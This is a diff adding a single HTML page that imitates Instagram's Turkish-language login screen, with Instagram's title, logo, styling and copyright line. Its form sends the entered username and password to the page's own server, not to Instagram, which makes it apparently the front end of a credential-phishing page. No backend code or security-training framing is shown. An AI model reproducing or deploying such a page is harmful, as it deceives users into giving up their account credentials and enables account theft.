@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Instagram</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #fafafa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .login-box {
+      background: white;
+      border: 1px solid #ddd;
+      padding: 40px;
+      width: 350px;
+      text-align: center;
+      box-shadow: 0 0 5px rgba(0,0,0,0.1);
+      border-radius: 8px;
+    }
+    .login-box img {
+      margin-bottom: 20px;
+      width: 175px;
+    }
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      margin: 8px 0;
+      padding: 10px;
+      border: 1px solid #dbdbdb;
+      border-radius: 4px;
+      background: #fafafa;
+      font-size: 14px;
+    }
+    button {
+      width: 100%;
+      background: #3897f0;
+      border: none;
+      color: white;
+      padding: 10px;
+      font-weight: bold;
+      border-radius: 4px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    button:hover {
+      background: #3183d9;
+    }
+    .footer-text {
+      margin-top: 15px;
+      font-size: 12px;
+      color: #999;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram Logo" />
+    <form method="POST" action="/">
+      <input type="text" name="username" placeholder="Telefon, kullanıcı adı veya e-posta" required />
+      <input type="password" name="password" placeholder="Şifre" required />
+      <button type="submit">Giriş Yap</button>
+    </form>
+    <div class="footer-text">© 2025 Instagram</div>
+  </div>
+</body>
+</html>
